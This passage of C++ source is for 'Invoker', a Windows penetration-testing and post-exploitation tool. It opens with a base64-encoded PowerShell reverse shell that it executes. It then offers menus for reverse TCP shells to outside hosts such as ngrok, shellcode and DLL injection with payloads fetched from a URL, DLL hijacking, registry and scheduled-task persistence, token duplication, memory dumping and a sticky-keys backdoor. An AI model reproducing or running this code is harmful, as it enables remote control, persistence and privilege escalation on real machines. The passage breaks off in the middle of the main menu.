	std::string encoded = std::string("JABhAGQAZAByACAAPQAgACQAKABSAG").append("UAYQBkAC0ASABvAHMAdAAgAC0AUABy").append("AG8AbQBwAHQAIAAiAEUAbgB0AGUAcg").append("AgAEkAUAAgAGEAZABkAHIAZQBzAHMA").append("IgApAC4AVAByAGkAbQAoACkAOwANAA").append("oAVwByAGkAdABlAC0ASABvAHMAdAAg").append("ACIAIgA7AA0ACgAkAHAAbwByAHQAIA").append("A9ACAAJAAoAFIAZQBhAGQALQBIAG8A").append("cwB0ACAALQBQAHIAbwBtAHAAdAAgAC").append("IARQBuAHQAZQByACAAcABvAHIAdAAg").append("AG4AdQBtAGIAZQByACIAKQAuAFQAcg").append("BpAG0AKAApADsADQAKAFcAcgBpAHQA").append("ZQAtAEgAbwBzAHQAIAAiACIAOwANAA").append("oAaQBmACAAKAAkAGEAZABkAHIALgBM").append("AGUAbgBnAHQAaAAgAC0AbAB0ACAAMQ").append("AgAC0AbwByACAAJABwAG8AcgB0AC4A").append("TABlAG4AZwB0AGgAIAAtAGwAdAAgAD").append("EAKQAgAHsADQAKAAkAVwByAGkAdABl").append("AC0ASABvAHMAdAAgACIAQgBvAHQAaA").append("AgAHAAYQByAGEAbQBlAHQAZQByAHMA").append("IABhAHIAZQAgAHIAZQBxAHUAaQByAG").append("UAZAAiADsADQAKAH0AIABlAGwAcwBl").append("ACAAewANAAoACQBXAHIAaQB0AGUALQ").append("BIAG8AcwB0ACAAIgAjACMAIwAjACMA").append("IwAjACMAIwAjACMAIwAjACMAIwAjAC").append("MAIwAjACMAIwAjACMAIwAjACMAIwAj").append("ACMAIwAjACMAIwAjACMAIwAjACMAIw").append("AjACMAIwAjACMAIwAjACMAIwAjACMA").append("IwAjACMAIwAjACMAIwAjACMAIwAjAC").append("MAIwAjACMAIwAjACMAIwAjACMAIwAi").append("ADsADQAKAAkAVwByAGkAdABlAC0ASA").append("BvAHMAdAAgACIAIwAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACAAIAAgACAAIAAg").append("ACAAIAAgACAAIAAgACAAIAAgACAAIA").append("AgACAAIAAgACAAIAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACAAIAAgACMAIgA7").append("AA0ACgAJAFcAcgBpAHQAZQAtAEgAbw").append("BzAHQAIAAiACMAIAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACAAUABvAHcAZQBy").append("AFMAaABlAGwAbAAgAFIAZQB2AGUAcg").append("BzAGUAIABUAEMAUAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACAAIAAjACIAOwAN").append("AAoACQBXAHIAaQB0AGUALQBIAG8Acw").append("B0ACAAIgAjACAAIAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACAAIAAgACAAIAAg").append("ACAAIAAgACAAIAAgACAAIAAgACAAIA").append("AgAGIAeQAgAEkAdgBhAG4AIABTAGkA").append("bgBjAGUAawAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACAAIwAiADsADQAK").append("AAkAVwByAGkAdABlAC0ASABvAHMAdA").append("AgACIAIwAgACAAIAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACAAIAAgACAAIAAg").append("ACAAIAAgACAAIAAgACAAIAAgACAAIA").append("AgACAAIAAgACAAIAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACMAIgA7AA0ACgAJ").append("AFcAcgBpAHQAZQAtAEgAbwBzAHQAIA").append("AiACMAIABHAGkAdABIAHUAYgAgAHIA").append("ZQBwAG8AcwBpAHQAbwByAHkAIABhAH").append("QAIABnAGkAdABoAHUAYgAuAGMAbwBt").append("AC8AaQB2AGEAbgAtAHMAaQBuAGMAZQ").append("BrAC8AcABvAHcAZQByAHMAaABlAGwA").append("bAAtAHIAZQB2AGUAcgBzAGUALQB0AG").append("MAcAAuACAAIAAjACIAOwANAAoACQBX").append("AHIAaQB0AGUALQBIAG8AcwB0ACAAIg").append("AjACAARgBlAGUAbAAgAGYAcgBlAGUA").append("IAB0AG8AIABkAG8AbgBhAHQAZQAgAG").append("IAaQB0AGMAbwBpAG4AIABhAHQAIAAx").append("AEIAcgBaAE0ANgBUADcARwA5AFIATg").append("A4AHYAYgBhAGIAbgBmAFgAdQA0AE0A").append("NgBMAHAAZwB6AHQAcQA2AFkAMQA0AC").append("4AIAAgACAAIwAiADsADQAKAAkAVwBy").append("AGkAdABlAC0ASABvAHMAdAAgACIAIw").append("AgACAAIAAgACAAIAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACAAIAAgACAAIAAgACAAIAAg").append("ACAAIAAgACAAIAAgACAAIAAgACAAIA").append("AgACAAIAAgACAAIAAgACAAIAAgACAA").append("IAAgACAAIAAgACAAIAAgACAAIAAgAC").append("AAIAAgACMAIgA7AA0ACgAJAFcAcgBp").append("AHQAZQAtAEgAbwBzAHQAIAAiACMAIw").append("AjACMAIwAjACMAIwAjACMAIwAjACMA").append("IwAjACMAIwAjACMAIwAjACMAIwAjAC").append("MAIwAjACMAIwAjACMAIwAjACMAIwAj").append("ACMAIwAjACMAIwAjACMAIwAjACMAIw").append("AjACMAIwAjACMAIwAjACMAIwAjACMA").append("IwAjACMAIwAjACMAIwAjACMAIwAjAC").append("MAIwAjACIAOwANAAoACQAkAGMAbABp").append("AGUAbgB0ACAAPQAgACQAbgB1AGwAbA").append("A7AA0ACgAJACQAcwB0AHIAZQBhAG0A").append("IAA9ACAAJABuAHUAbABsADsADQAKAA").append("kAJABiAHUAZgBmAGUAcgAgAD0AIAAk").append("AG4AdQBsAGwAOwANAAoACQAkAHcAcg").append("BpAHQAZQByACAAPQAgACQAbgB1AGwA").append("bAA7AA0ACgAJACQAZABhAHQAYQAgAD").append("0AIAAkAG4AdQBsAGwAOwANAAoACQAk").append("AHIAZQBzAHUAbAB0ACAAPQAgACQAbg").append("B1AGwAbAA7AA0ACgAJAHQAcgB5ACAA").append("ewANAAoACQAJACMAIABjAGgAYQBuAG").append("cAZQAgAHQAaABlACAAaABvAHMAdAAg").append("AGEAZABkAHIAZQBzAHMAIABhAG4AZA").append("AvAG8AcgAgAHAAbwByAHQAIABuAHUA").append("bQBiAGUAcgAgAGEAcwAgAG4AZQBjAG").append("UAcwBzAGEAcgB5AA0ACgAJAAkAJABj").append("AGwAaQBlAG4AdAAgAD0AIABOAGUAdw").append("AtAE8AYgBqAGUAYwB0ACAATgBlAHQA").append("LgBTAG8AYwBrAGUAdABzAC4AVABjAH").append("AAQwBsAGkAZQBuAHQAKAAkAGEAZABk").append("AHIALAAgACQAcABvAHIAdAApADsADQ").append("AKAAkACQAkAHMAdAByAGUAYQBtACAA").append("PQAgACQAYwBsAGkAZQBuAHQALgBHAG").append("UAdABTAHQAcgBlAGEAbQAoACkAOwAN").append("AAoACQAJACQAYgB1AGYAZgBlAHIAIA").append("A9ACAATgBlAHcALQBPAGIAagBlAGMA").append("dAAgAEIAeQB0AGUAWwBdACAAMQAwAD").append("IANAA7AA0ACgAJAAkAJABlAG4AYwBv").append("AGQAaQBuAGcAIAA9ACAATgBlAHcALQ").append("BPAGIAagBlAGMAdAAgAFQAZQB4AHQA").append("LgBBAHMAYwBpAGkARQBuAGMAbwBkAG").append("kAbgBnADsADQAKAAkACQAkAHcAcgBp").append("AHQAZQByACAAPQAgAE4AZQB3AC0ATw").append("BiAGoAZQBjAHQAIABJAE8ALgBTAHQA").append("cgBlAGEAbQBXAHIAaQB0AGUAcgAoAC").append("QAcwB0AHIAZQBhAG0AKQA7AA0ACgAJ").append("AAkAJAB3AHIAaQB0AGUAcgAuAEEAdQ").append("B0AG8ARgBsAHUAcwBoACAAPQAgACQA").append("dAByAHUAZQA7AA0ACgAJAAkAVwByAG").append("kAdABlAC0ASABvAHMAdAAgACIAQgBh").append("AGMAawBkAG8AbwByACAAaQBzACAAdQ").append("BwACAAYQBuAGQAIAByAHUAbgBuAGkA").append("bgBnAC4ALgAuACIAOwANAAoACQAJAG").append("QAbwAgAHsADQAKAAkACQAJACQAdwBy").append("AGkAdABlAHIALgBXAHIAaQB0AGUAKA").append("AiAFAAUwA+ACIAKQA7AA0ACgAJAAkA").append("CQBkAG8AIAB7AA0ACgAJAAkACQAJAC").append("QAYgB5AHQAZQBzACAAPQAgACQAcwB0").append("AHIAZQBhAG0ALgBSAGUAYQBkACgAJA").append("BiAHUAZgBmAGUAcgAsACAAMAAsACAA").append("JABiAHUAZgBmAGUAcgAuAEwAZQBuAG").append("cAdABoACkAOwANAAoACQAJAAkACQBp").append("AGYAIAAoACQAYgB5AHQAZQBzACAALQ").append("BnAHQAIAAwACkAIAB7AA0ACgAJAAkA").append("CQAJAAkAJABkAGEAdABhACAAPQAgAC").append("QAZABhAHQAYQAgACsAIAAkAGUAbgBj").append("AG8AZABpAG4AZwAuAEcAZQB0AFMAdA").append("ByAGkAbgBnACgAJABiAHUAZgBmAGUA").append("cgAsACAAMAAsACAAJABiAHkAdABlAH").append("MAKQA7AA0ACgAJAAkACQAJAH0AIABl").append("AGwAcwBlACAAewANAAoACQAJAAkACQ").append("AJACQAZABhAHQAYQAgAD0AIAAiAGUA").append("eABpAHQAIgA7AA0ACgAJAAkACQAJAH").append("0ADQAKAAkACQAJAH0AIAB3AGgAaQBs").append("AGUAIAAoACQAcwB0AHIAZQBhAG0ALg").append("BEAGEAdABhAEEAdgBhAGkAbABhAGIA").append("bABlACkAOwANAAoACQAJAAkAaQBmAC").append("AAKAAkAGQAYQB0AGEALgBMAGUAbgBn").append("AHQAaAAgAC0AZwB0ACAAMAAgAC0AYQ").append("BuAGQAIAAkAGQAYQB0AGEAIAAtAG4A").append("ZQAgACIAZQB4AGkAdAAiACkAIAB7AA").append("0ACgAJAAkACQAJAHQAcgB5ACAAewAN").append("AAoACQAJAAkACQAJACQAcgBlAHMAdQ").append("BsAHQAIAA9ACAASQBuAHYAbwBrAGUA").append("LQBFAHgAcAByAGUAcwBzAGkAbwBuAC").append("AALQBDAG8AbQBtAGEAbgBkACAAJABk").append("AGEAdABhACAAfAAgAE8AdQB0AC0AUw").append("B0AHIAaQBuAGcAOwANAAoACQAJAAkA").append("CQB9ACAAYwBhAHQAYwBoACAAewANAA").append("oACQAJAAkACQAJACQAcgBlAHMAdQBs").append("AHQAIAA9ACAAJABfAC4ARQB4AGMAZQ").append("BwAHQAaQBvAG4ALgBJAG4AbgBlAHIA").append("RQB4AGMAZQBwAHQAaQBvAG4ALgBNAG").append("UAcwBzAGEAZwBlADsADQAKAAkACQAJ").append("AAkAfQANAAoACQAJAAkACQAkAHcAcg").append("BpAHQAZQByAC4AVwByAGkAdABlAEwA").append("aQBuAGUAKAAkAHIAZQBzAHUAbAB0AC").append("kAOwANAAoACQAJAAkACQBDAGwAZQBh").append("AHIALQBWAGEAcgBpAGEAYgBsAGUAIA").append("AtAE4AYQBtAGUAIAAiAGQAYQB0AGEA").append("IgA7AA0ACgAJAAkACQB9AA0ACgAJAA").append("kAfQAgAHcAaABpAGwAZQAgACgAJABk").append("AGEAdABhACAALQBuAGUAIAAiAGUAeA").append("BpAHQAIgApADsADQAKAAkAfQAgAGMA").append("YQB0AGMAaAAgAHsADQAKAAkACQBXAH").append("IAaQB0AGUALQBIAG8AcwB0ACAAJABf").append("AC4ARQB4AGMAZQBwAHQAaQBvAG4ALg").append("BJAG4AbgBlAHIARQB4AGMAZQBwAHQA").append("aQBvAG4ALgBNAGUAcwBzAGEAZwBlAD").append("sADQAKAAkAfQAgAGYAaQBuAGEAbABs").append("AHkAIAB7AA0ACgAJAAkAaQBmACAAKA").append("AkAHcAcgBpAHQAZQByACAALQBuAGUA").append("IAAkAG4AdQBsAGwAKQAgAHsADQAKAA").append("kACQAJACQAdwByAGkAdABlAHIALgBD").append("AGwAbwBzAGUAKAApADsADQAKAAkACQ").append("AJACQAdwByAGkAdABlAHIALgBEAGkA").append("cwBwAG8AcwBlACgAKQA7AA0ACgAJAA").append("kAfQANAAoACQAJAGkAZgAgACgAJABz").append("AHQAcgBlAGEAbQAgAC0AbgBlACAAJA").append("BuAHUAbABsACkAIAB7AA0ACgAJAAkA").append("CQAkAHMAdAByAGUAYQBtAC4AQwBsAG").append("8AcwBlACgAKQA7AA0ACgAJAAkACQAk").append("AHMAdAByAGUAYQBtAC4ARABpAHMAcA").append("BvAHMAZQAoACkAOwANAAoACQAJAH0A").append("DQAKAAkACQBpAGYAIAAoACQAYwBsAG").append("kAZQBuAHQAIAAtAG4AZQAgACQAbgB1").append("AGwAbAApACAAewANAAoACQAJAAkAJA").append("BjAGwAaQBlAG4AdAAuAEMAbABvAHMA").append("ZQAoACkAOwANAAoACQAJAAkAJABjAG").append("wAaQBlAG4AdAAuAEQAaQBzAHAAbwBz").append("AGUAKAApADsADQAKAAkACQB9AA0ACg").append("AJAAkAaQBmACAAKAAkAGIAdQBmAGYA").append("ZQByACAALQBuAGUAIAAkAG4AdQBsAG").append("wAKQAgAHsADQAKAAkACQAJACQAYgB1").append("AGYAZgBlAHIALgBDAGwAZQBhAHIAKA").append("ApADsADQAKAAkACQB9AA0ACgAJAAkA").append("aQBmACAAKAAkAGQAYQB0AGEAIAAtAG").append("4AZQAgACQAbgB1AGwAbAApACAAewAN").append("AAoACQAJAAkAQwBsAGUAYQByAC0AVg").append("BhAHIAaQBhAGIAbABlACAALQBOAGEA").append("bQBlACAAIgBkAGEAdABhACIAOwANAA").append("oACQAJAH0ADQAKAAkACQBpAGYAIAAo").append("ACQAcgBlAHMAdQBsAHQAIAAtAG4AZQ").append("AgACQAbgB1AGwAbAApACAAewANAAoA").append("CQAJAAkAQwBsAGUAYQByAC0AVgBhAH").append("IAaQBhAGIAbABlACAALQBOAGEAbQBl").append("ACAAIgByAGUAcwB1AGwAdAAiADsADQ").append("AKAAkACQB9AA0ACgAJAH0ADQAKAH0A").append("DQAKAA==");
	PowerShellExec(encoded);
}

// ----------------------------------- FILES -----------------------------------

void CPP_DownloadFile() {
	std::string url = Input("Enter URL");
	Output("");
	std::string out = Input("Enter output file name");
	Output("");
	if (url.length() < 1 || out.length() < 1) {
		Output("Both parameters are required");
	}
	else {
		DownloadFile(url, out);
	}
}

// -------------------------------- PERSISTENCE --------------------------------

void CPP_EditRegistryKey() {
	Output("################################# EXAMPLES #################################");
	Output("# Hive   : HKEY_CURRENT_USER | HKEY_LOCAL_MACHINE                          #");
	Output("# Subkey : Software\\Microsoft\\Windows\\CurrentVersion\\Run                   #");
	Output("# Name   : PowerShell                                                      #");
	Output("# Data   : C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe       #");
	Output("#--------------------------------------------------------------------------#");
	Output("# Hive   : HKEY_CURRENT_USER | HKEY_LOCAL_MACHINE                          #");
	Output("# Subkey : Software\\Policies\\Microsoft\\Windows\\Installer                   #");
	Output("# Name   : AlwaysInstallElevated                                           #");
	Output("# Data   : 1                                                               #");
	Output("################################### NOTE ###################################");
	Output("# In the second example, use MSI payload.                                  #");
	Output("#--------------------------------------------------------------------------#");
	Output("# By default, only string value (REG_SZ) can be added.                     #");
	Output("############################################################################");
	Output("");
	Output("############################## REGISTRY HIVES ##############################");
	Output("# [1] HKEY_CLASSES_ROOT                                                    #");
	Output("# [2] HKEY_CURRENT_USER                                                    #");
	Output("# [3] HKEY_LOCAL_MACHINE                                                   #");
	Output("# [4] HKEY_USERS                                                           #");
	Output("# [5] HKEY_CURRENT_CONFIG                                                  #");
	Output("############################################################################");
	std::string choice = Input("Choose registry hive");
	Output("");
	HKEY hKey = NULL;
	if (choice == "1") {
		hKey = HKEY_CLASSES_ROOT;
	}
	else if (choice == "2") {
		hKey = HKEY_CURRENT_USER;
	}
	else if (choice == "3") {
		hKey = HKEY_LOCAL_MACHINE;
	}
	else if (choice == "4") {
		hKey = HKEY_USERS;
	}
	else if (choice == "5") {
		hKey = HKEY_CURRENT_CONFIG;
	}
	else {
		Output("Invalid choice");
	}
	if (hKey != NULL) {
		std::string subkey = Input("Enter subkey");
		Output("");
		std::string name = Input("Enter value name");
		Output("");
		std::string data = Input("Enter value data");
		Output("");
		std::string confirm = Input("Confirm (yes)");
		if (StrToLower(confirm) == "yes") {
			Output("");
			EditRegistryKey(&hKey, subkey, name, data);
		}
	}
}

void CPP_ScheduleTask() {
	Output("################################# EXAMPLES #################################");
	Output("# Name : CMD                                                               #");
	Output("# User : Kira                                                              #");
	Output("# File : C:\\Windows\\System32\\cmd.exe                                       #");
	Output("# Args : /K WHOAMI /PRIV                                                   #");
	Output("#--------------------------------------------------------------------------#");
	Output("# Name : PowerShell                                                        #");
	Output("# User : NT AUTHORITY\\SYSTEM                                               #");
	Output("# File : C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe         #");
	Output("################################### NOTE ###################################");
	Output("# Task will trigger only once, after exactly one minute.                   #");
	Output("############################################################################");
	Output("");
	std::string name = Input("Enter task name");
	Output("");
	std::string user = Input("Enter user name");
	Output("");
	std::string file = Input("Enter file name");
	Output("");
	std::string args = Input("Enter file arguments (optional)");
	Output("");
	if (name.length() < 1 || user.length() < 1 || file.length() < 1) {
		Output("Required parameters are missing");
	}
	else {
		ScheduleTask(name, user, file, args);
	}
}

// ------------------------------------ WMI ------------------------------------

std::string WMI_SetNamespace(std::string space) {
	Output("################################# EXAMPLES #################################");
	Output("# Namespace : ROOT\\CIMV2                                                   #");
	Output("#--------------------------------------------------------------------------#");
	Output("# Namespace : ROOT\\SUBSCRIPTION                                            #");
	Output("############################################################################");
	Output("");
	std::string tmp = Input("Enter namespace");
	if (tmp.length() < 1) {
		Output("");
		Output("Namespace is required");
	}
	else {
		space = tmp;
	}
	return space;
}

void WMI_RunQuery(std::string space) {
	Output("################################### INFO ###################################");
	printf("# Namespace : %-*.*s #\n", 61, 61, space.c_str());
	Output("# Language  : WQL                                                          #");
	Output("#--------------------------------------------------------------------------#");
	Output("# Enter \"back\" to return to the WMI menu.                                  #");
	Output("# Enter \"clear\" or \"cls\" to clear the window.                              #");
	Output("############################################################################");
	Output("");
	Output("################################# EXAMPLES #################################");
	Output("# Query : SELECT * FROM Win32_Process                                      #");
	Output("#--------------------------------------------------------------------------#");
	Output("# Query : SELECT * FROM Win32_Service                                      #");
	Output("#--------------------------------------------------------------------------#");
	Output("# Query : SELECT * FROM Win32_Account                                      #");
	Output("################################# NOTE #####################################");
	Output("# Sometimes retrieving specific properties can get bugged.                 #");
	Output("############################################################################");
	Output("");
	std::string query = "back";
	do {
		query = Input("Enter query");
		if (query.length() < 1) {
			Output("");
			Output("Query is required");
			Output("");
		}
		else if (StrToLower(query) == "clear" || StrToLower(query) == "cls") {
			Clear();
		}
		else if (StrToLower(query) != "back") {
			Output("");
			WMIRunQuery(query, "WQL", space);
			Output("");
		}
	} while (StrToLower(query) != "back");
}

void WMI_ExecuteMethod(std::string space) {
	Output("################################# EXAMPLES #################################");
	Output("# Class    : Win32_Process                                                 #");
	Output("# Method   : Create                                                        #");
	Output("# Property : CommandLine                                                   #");
	Output("# Value    : C:\\Windows\\System32\\cmd.exe /K \"WHOAMI /PRIV\"                 #");
	Output("#--------------------------------------------------------------------------#");
	Output("# Class    : Win32_Process.Handle=\"3301\"                                   #");
	Output("# Method   : Terminate                                                     #");
	Output("# Property : Reason                                                        #");
	Output("#--------------------------------------------------------------------------#");
	Output("# Class    : Win32_Service.Name=\"EventLog\"                                 #");
	Output("# Method   : StopService | StartService                                    #");
	Output("############################################################################");
	Output("");
	std::string obj = Input("Enter WMI class");
	Output("");
	std::string method = Input("Enter WMI class method");
	Output("");
	std::string property = Input("Enter WMI class property (optional)");
	Output("");
	std::string value = Input("Enter WMI class property value (optional)");
	Output("");
	if (obj.length() > 0 && method.length() > 0 && property.length() > 0) {
		WMIExecuteMethod(obj, method, property, value, space);
	}
	else if (obj.length() > 0 && method.length() > 0) {
		WMIExecuteMethod(obj, method, space);
	}
	else {
		Output("Required parameters are missing");
	}
}

void CPP_WMI() {
	std::string space = "ROOT\\CIMV2";
	std::string choice = "0";
	do {
		Output("#################### WINDOWS MANAGEMENT INSTRUMENTATION ####################");
		Output("# [0] Exit                                                                 #");
		Output("#--------------------------------------------------------------------------#");
		Output("# [1] Set namespace                                                        #");
		Output("#--------------------------------------------------------------------------#");
		Output("# [2] Run query                                                            #");
		Output("# [3] Execute method                                                       #");
		Output("############################################################################");
		printf("# Namespace: %-*.*s #\n", 61, 61, space.c_str());
		Output("################################### NOTE ###################################");
		Output("# More features are in development.                                        #");
		Output("############################################################################");
		choice = Input("Your choice");
		if (choice != "0") {
			Clear();
		}
		if (IsPositiveNumber(choice)) {
			int num = atoi(choice.c_str());
			if (num >= 1 && num <= 3) {
				switch (num) {
					case  1: { space = WMI_SetNamespace(space); break; }
					case  2: { WMI_RunQuery(space);             break; }
					case  3: { WMI_ExecuteMethod(space);        break; }
				}
				Clear(true);
			}
		}
	} while (choice != "0");
}

// --------------------------------- PROCESSES ---------------------------------

void CPP_ReverseTCP() {
	Output("################################# EXAMPLES #################################");
	Output("# IP   : 192.168.8.5                                                       #");
	Output("# Port : 9000                                                              #");
	Output("#--------------------------------------------------------------------------#");
	Output("# Address : 2.tcp.ngrok.io                                                 #");
	Output("# Port    : 11650                                                          #");
	Output("############################################################################");
	Output("");
	std::string ip = Input("Enter IP address");
	Output("");
	std::string port = Input("Enter port number");
	Output("");
	if (ip.length() < 1 || port.length() < 1) {
		Output("Both parameters are required");
	}
	else if (!IsPositiveNumber(port)) {
		Output("Port number must be a positive number");
	}
	else {
		std::string name = GetFileName();
		ReverseTCP(ip, atoi(port.c_str()), name.length() > 0 ? name : "CMD");
	}
}

void CPP_TerminateProcess() {
	int pid = GetProcessID();
	if (pid != -1) {
		Output("");
		TerminateProcess(pid);
	}
}

void CPP_RunProcess() {
	Output("################################# EXAMPLES #################################");
	Output("# File : C:\\Windows\\System32\\cmd.exe                                       #");
	Output("# Args : /K WHOAMI /PRIV                                                   #");
	Output("#--------------------------------------------------------------------------#");
	Output("# File : C:\\Windows\\SysWOW64\\cmd.exe                                       #");
	Output("#--------------------------------------------------------------------------#");
	Output("# File : C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe         #");
	Output("################################### NOTE ###################################");
	Output("# Process will run in a new window.                                        #");
	Output("############################################################################");
	Output("");
	std::string file = Input("Enter file name");
	Output("");
	std::string args = Input("Enter file arguments (optional)");
	Output("");
	if (file.length() < 1) {
		Output("File name is rquired");
	}
	else {
		RunProcess(file, args);
	}
}

void CPP_DumpProcessMemory() {
	int pid = GetProcessID();
	if (pid != -1) {
		Output("");
		DumpProcessMemory(pid);
	}
}

// --------------------------------- BYTECODES ---------------------------------

void CPP_InjectBytcodeWeb() {
	Output("################################# EXAMPLES #################################");
	Output("# URL     : 08ab992ff989.ngrok.io/payload.txt                              #");
	Output("# Port    : 80                                                             #");
	Output("# Element : <invoker>payload</invoker>                                     #");
	Output("################################### NOTE ###################################");
	Output("# By default, HTTP GET request will be sent.                               #");
	Output("# This method does not yet support HTTPS.                                  #");
	Output("#--------------------------------------------------------------------------#");
	Output("# Custom element must be unique within the web content.                    #");
	Output("# Payload must be enclosed from both front and back.                       #");
	Output("############################################################################");
	Output("");
	std::string url = Input("Enter URL");
	Output("");
	std::string port = Input("Enter port number");
	Output("");
	std::string element = Input("Enter custom element");
	Output("");
	if (url.length() < 1 || port.length() < 1 || element.length() < 1) {
		Output("All parameters are required");
	}
	else if (!IsPositiveNumber(port)) {
		Output("Port number must be a positive number");
	}
	else {
		std::string data = GetWebContent(url, atoi(port.c_str()));
		if (data.length() > 0) {
			std::string payload = ExtractPayload(data, element);
			if (payload.length() > 0) {
				Output("");
				int pid = GetProcessID();
				if (pid != -1) {
					Output("");
					// NOTE: Change or omit the payload decoder here.
					payload = base64_decode(payload);
					InjectBytecode(pid, payload);
				}
			}
		}
	}
}

void CPP_InjectBytcodeFile() {
	Output("################################# EXAMPLES #################################");
	Output("# File : C:\\Users\\Kira\\Downloads\\payload.bin                               #");
	Output("################################### NOTE ###################################");
	Output("# Bytecode will run in a new thread.                                       #");
	Output("############################################################################");
	Output("");
	std::string file = Input("Enter file name");
	Output("");
	if (file.length() < 1) {
		Output("File name is required");
	}
	else {
		std::string payload = ReadFile(file);
		if (payload.length() > 0) {
			int pid = GetProcessID();
			if (pid != -1) {
				Output("");
				InjectBytecode(pid, payload);
			}
		}
	}
}

// ------------------------------------ DLL ------------------------------------

void CPP_InjectDLL() {
	Output("################################# EXAMPLES #################################");
	Output("# File : C:\\Users\\Kira\\Downloads\\payload.dll                               #");
	Output("################################# NOTE #####################################");
	Output("# DLL will run in a new thread.                                            #");
	Output("############################################################################");
	Output("");
	std::string file = Input("Enter file name");
	Output("");
	if (file.length() < 1) {
		Output("File name is required");
	}
	else {
		int pid = GetProcessID();
		if (pid != -1) {
			Output("");
			InjectDLL(pid, file);
		}
	}
}

void CPP_DLLHijacking() {
	int pid = GetProcessID();
	if (pid != -1) {
		Output("");
		ListProcessDLLs(pid);
		Output("");
		Output("################################# NOTE #####################################");
		Output("# This method will only list loaded DLLs.                                  #");
		Output("#--------------------------------------------------------------------------#");
		Output("# Rename your \"payload.dll\" to any of the listed DLLs and replace it.      #");
		Output("# Some directories may require a write permission.                         #");
		Output("# Restart the process if needed.                                           #");
		Output("# Some processes may crash or not work correctly afterwards.               #");
		Output("############################################################################");
	}
}

// NOTE: Structure is defined in ".\lib\invoker.h".
hook info = { "", NULL, false };

void CPP_InstallWindowsHook() {
	if (!info.active) {
		Output("################################# EXAMPLES #################################");
		Output("# File : C:\\Users\\Kira\\Downloads\\InvokerHook_x64.dll                       #");
		Output("################################# NOTE #####################################");
		Output("# Only one hook can be active at the time.                                 #");
		Output("############################################################################");
		std::string file = Input("Enter file name");
		Output("");
		if (file.length() < 1) {
			Output("File name is rquired");
		}
		else {
			info.file = file;
			info.hThread = CreateHookThread(&info);
		}
	}
	else {
		std::string confirm = Input("Uninstall hook procedure (yes)");
		if (StrToLower(confirm) == "yes") {
			RemoveHookThread(&info);
		}
	}
}

// ----------------------------------- TOKEN -----------------------------------

void CPP_EnableAccessTokenPrivs() {
	EnableAccessTokenPrivs();
}

void CPP_DuplicateAccessToken() {
	Output("################################# EXAMPLES #################################");
	Output("# File : C:\\Windows\\System32\\cmd.exe                                       #");
	Output("# Args : /K WHOAMI /PRIV                                                   #");
	Output("# PID  : 1337                                                              #");
	Output("#--------------------------------------------------------------------------#");
	Output("# File : C:\\Users\\Kira\\Downloads\\Invoker_x64.exe                           #");
	Output("# PID  : 3301                                                              #");
	Output("################################# NOTE #####################################");
	Output("# Process will run in a new window.                                        #");
	Output("############################################################################");
	Output("");
	std::string file = Input("Enter file name");
	Output("");
	std::string args = Input("Enter file arguments (optional)");
	Output("");
	if (file.length() < 1) {
		Output("File name is rquired");
	}
	else {
		int pid = GetProcessID();
		if (pid != -1) {
			Output("");
			HANDLE hToken = DuplicateAccessToken(pid);
			if (hToken != NULL) {
				Output("");
				RunProcess(file, args, &hToken);
				CloseHandle(hToken);
			}
		}
	}
}
// ----------------------------------- MISCS -----------------------------------

void CPP_UnquotedServicePaths() {
	std::string name = GetUnquotedServiceName();
	if (name.length() > 0) {
		Output("");
		Output("############################################################################");
		Output("# [1] Start                                                                #");
		Output("# [2] Stop                                                                 #");
		Output("# [3] Restart                                                              #");
		Output("############################################################################");
		std::string choice = Input("Your choice");
		Output("");
		if (choice == "1") {
			ManageService(name, SVC_START);
		}
		else if (choice == "2") {
			ManageService(name, SVC_STOP);
		}
		else if (choice == "3") {
			ManageService(name, SVC_RESTART);
		}
		else {
			Output("Invalid choice");
		}
	}
}

void CPP_ReplaceStickyKeys() {
	if (ReplaceStickyKeys() != 0) {
		Output("");
		Output("################################# NOTE #####################################");
		Output("# To restore the backup, rename \"sethc_backup.exe\" back to \"sethc.exe\".    #");
		Output("############################################################################");
	}
}

// -----------------------------------------------------------------------------

int main(int argc, char** argv) {
	SetConsoleTitle("Invoker");
	if (argc == 3) {
		std::string name = GetFileName();
		ReverseTCP(argv[1], atoi(argv[2]), name.length() > 0 ? name : "CMD");
	}
	else {
		std::string choice = "0";
		do {
			Output("############################################################################");
			Output("#                                                                          #");
			Output("#                             Invoker v3.4.4                               #");
			Output("#                                     by Ivan Sincek                       #");
			Output("#                                                                          #");
			Output("# Penetration testing utility.                                             #");
			Output("# GitHub repository at github.com/ivan-sincek/invoker.                     #");
			Output("# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.       #");
			Output("#                                                                          #");
			Output("############################################################################");
			Output("# [ 0]            Exit                                                     #");
			Output("############################################################################");
			Output("# [ 1] [SYSTEM]   Invoke CMD                                               #");
			Output("# [ 2] [SYSTEM]   Invoke PS                                                #");
			Output("#--------------------------------------------------------------------------#");
			Output("# [ 3] [MS WORD]  Invoke CMD & PS                                          #");
			Output("#--------------------------------------------------------------------------#");
			Output("# [ 4] [PS]       Reverse TCP                                              #");
			Output("#--------------------------------------------------------------------------#");
			Output("# [ 5] [C++]      Download File                                            #");
			Output("# [ 6] [C++]      Add/Edit Registry Key                                    #");
			Output("# [ 7] [C++]      Schedule Task                                            #");
			Output("# [ 8] [C++]      Windows Management Instrumentation (WMI)                 #");
			Output("#--------------------------------------------------------------------------#");
			Output("# [ 9] [C++]      Reverse TCP                                              #");
